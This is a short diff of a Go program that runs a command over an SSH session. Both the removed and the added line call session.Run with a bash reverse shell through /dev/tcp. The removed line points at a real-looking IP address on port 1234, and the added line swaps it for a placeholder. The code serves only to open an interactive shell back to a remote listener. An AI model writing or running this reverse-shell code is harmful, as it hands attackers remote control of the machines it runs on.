@@ -42,7 +42,7 @@ func main() {
 	session.Stdout = &b
 
 	// 也可以使用 session.CombinedOutput() 整合输出
-	if err := session.Run("bash -i >& /dev/tcp/123.249.104.83/1234 0>&1"); err != nil {
+	if err := session.Run("bash -i >& /dev/tcp/xx.xx.xx.xx/1234 0>&1"); err != nil {
 		log.Fatal("Failed to run: " + err.Error())
 	}
 
